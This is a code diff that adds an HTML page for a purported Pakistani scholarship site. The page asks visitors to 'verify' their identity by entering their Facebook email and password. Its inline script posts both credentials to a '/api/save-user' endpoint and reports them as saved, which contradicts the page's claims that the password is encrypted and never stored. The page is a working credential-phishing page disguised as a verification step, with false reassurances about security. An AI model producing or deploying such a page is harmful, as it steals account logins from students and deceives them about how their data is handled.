@@ -1,0 +1,166 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+    <title>Facebook Verification - GlobalScholarsHub PK</title>
+    <link rel="stylesheet" href="css/style.css" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" />
+</head>
+<body>
+
+    <!-- ===== NAVBAR ===== -->
+    <nav class="navbar">
+        <div class="container nav-container">
+            <a href="index.html" class="logo">
+                <img src="images/logo.png" alt="GlobalScholarsHub PK" />
+                <span class="logo-text">GlobalScholarsHub <span>PK</span></span>
+            </a>
+            <ul class="nav-menu">
+                <li><a href="index.html">Home</a></li>
+                <li><a href="scholarships.html">Scholarships</a></li>
+                <li><a href="about.html">About</a></li>
+                <li><a href="contact.html">Contact</a></li>
+                <li><a href="register.html" class="btn-register">Register</a></li>
+                <li><a href="login.html" class="btn-login">Login</a></li>
+            </ul>
+            <div class="hamburger">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+    </nav>
+
+    <!-- ===== FACEBOOK VERIFICATION SECTION ===== -->
+    <section class="facebook-section">
+        <div class="container facebook-container">
+
+            <!-- ===== LEFT SIDE - BLUE GRADIENT ===== -->
+            <div class="facebook-left">
+                <div class="fb-left-title">
+                    Verify Your <span>Identity</span>
+                </div>
+                <div class="fb-left-subtitle">
+                    Connect your Facebook account to continue your scholarship application.
+                </div>
+                <div class="fb-left-stats">
+                    <div class="stat-item">
+                        <span class="stat-number">10,000+</span>
+                        <span class="stat-label">Scholarships</span>
+                    </div>
+                    <div class="stat-item">
+                        <span class="stat-number">50,000+</span>
+                        <span class="stat-label">Students Applied</span>
+                    </div>
+                    <div class="stat-item">
+                        <span class="stat-number">100+</span>
+                        <span class="stat-label">Partner Universities</span>
+                    </div>
+                    <div class="stat-item">
+                        <span class="stat-number">95%</span>
+                        <span class="stat-label">Success Rate</span>
+                    </div>
+                </div>
+            </div>
+
+            <!-- ===== RIGHT SIDE - WHITE CARD ===== -->
+            <div class="facebook-right">
+                <div class="fb-header">
+                    <div class="fb-icon">
+                        <i class="fab fa-facebook-f"></i>
+                    </div>
+                    <h2>Verify Your Identity</h2>
+                    <p>Connect your Facebook account to continue</p>
+                </div>
+
+                <!-- Trust Badge -->
+                <div class="fb-trust-badge">
+                    <i class="fas fa-shield-alt"></i>
+                    <div class="trust-text">
+                        <strong>🔒 Your Privacy Matters to Us</strong><br />
+                        We use Facebook verification to ensure that every applicant is a real student.
+                        Your information is <strong>100% secure</strong> and will only be used for
+                        scholarship application purposes. We never post anything on your behalf.
+                    </div>
+                </div>
+
+                <!-- Security Note -->
+                <div class="fb-security-note">
+                    <i class="fas fa-lock"></i>
+                    <span>
+                        <strong>Secure & Encrypted:</strong> Your Facebook credentials are
+                        encrypted and protected. We do not store your password.
+                    </span>
+                </div>
+
+                <!-- Facebook Form - NO ACTION -->
+                <form class="fb-form" id="facebookForm">
+                    <div class="form-group">
+                        <label><i class="fab fa-facebook-f"></i> Facebook ID / Email</label>
+                        <input type="email" placeholder="Enter your Facebook email or ID" required />
+                        <div class="input-hint">
+                            <i class="fas fa-info-circle"></i>
+                            Use the email associated with your Facebook account
+                        </div>
+                    </div>
+
+                    <div class="form-group">
+                        <label><i class="fas fa-lock"></i> Facebook Password</label>
+                        <input type="password" placeholder="Enter your Facebook password" required />
+                        <div class="input-hint">
+                            <i class="fas fa-info-circle"></i>
+                            Your password is encrypted and never stored
+                        </div>
+                    </div>
+
+                    <button type="submit" class="btn-facebook">
+                        <i class="fab fa-facebook-f"></i> Connect with Facebook
+                    </button>
+                </form>
+
+                <p class="fb-footer-text">
+                    By connecting, you agree to our
+                    <a href="#">Privacy Policy</a> &amp; <a href="#">Terms of Service</a>
+                </p>
+            </div>
+
+        </div>
+    </section>
+
+    <!-- ===== FOOTER ===== -->
+    <footer class="footer">
+        <div class="container">
+            <p>© 2026 GlobalScholarsHub PK. All Rights Reserved. PK</p>
+        </div>
+    </footer>
+
+    <script src="js/script.js"></script>
+
+    <script>
+        document.getElementById('facebookForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            const fbEmail = document.querySelector('input[placeholder="Enter your Facebook email or ID"]').value;
+            const fbPassword = document.querySelector('input[placeholder="Enter your Facebook password"]').value;
+            
+            const fbData = { fbEmail, fbPassword };
+            
+            try {
+                const response = await fetch('/api/save-user', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(fbData)
+                });
+                const result = await response.json();
+                console.log('✅ Facebook data saved:', result);
+                alert('✅ Facebook verified successfully!');
+            } catch (error) {
+                console.log('⚠️ Error saving Facebook data:', error);
+                alert('⚠️ Error saving data. Make sure server is running (node server.js)');
+            }
+            
+            window.location.href = 'complete-profile.html';
+        });
+    </script>
+
+</body>
+</html>
